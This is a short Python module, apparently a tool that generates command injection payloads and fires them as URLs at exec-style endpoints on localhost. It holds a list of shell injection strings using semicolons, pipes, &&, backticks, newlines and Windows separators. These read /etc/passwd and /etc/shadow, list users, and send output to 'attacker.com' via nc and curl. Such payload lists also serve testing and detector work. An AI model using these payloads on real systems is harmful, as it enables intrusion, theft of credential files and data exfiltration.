"""
tools/cmdi_atk.py — Command Injection attack payload generator
"""
import random

_SEMICOLON = [
    "id;whoami",
    "ls;cat /etc/passwd",
    "echo hello;id",
    ";cat /etc/shadow",
    "whoami;uname -a",
]

_PIPE = [
    "ls | whoami",
    "cat /etc/passwd | nc attacker.com 4444",
    "id | curl http://attacker.com/?out=$(id)",
    "whoami | base64",
]

_AND = [
    "id && whoami",
    "ping -c 1 127.0.0.1 && id",
    "echo test && cat /etc/passwd",
    "dir && whoami",
    "ipconfig && net user",
]

_BACKTICK = [
    "`id`",
    "`cat /etc/passwd`",
    "`whoami`",
]

_NEWLINE = [
    "valid_input\nwhoami",
    "test\ncat /etc/passwd",
    "data\nid\nls -la",
]

_WINDOWS = [
    "cmd.exe /c whoami",
    "| net user",
    "& ipconfig",
    "; dir C:\\",
    "cmd /c dir",
]

ALL_PAYLOADS = _SEMICOLON + _PIPE + _AND + _BACKTICK + _NEWLINE + _WINDOWS

CMDI_PATHS  = ["/exec", "/run", "/ping", "/cmd", "/execute", "/api/exec", "/system"]
CMDI_PARAMS = ["cmd", "command", "exec", "host", "input", "query", "run"]


def generate() -> tuple[str, str]:
    payload = random.choice(ALL_PAYLOADS)
    path    = random.choice(CMDI_PATHS)
    param   = random.choice(CMDI_PARAMS)
    url     = f"http://localhost:8000{path}?{param}={payload}"
    return url, payload
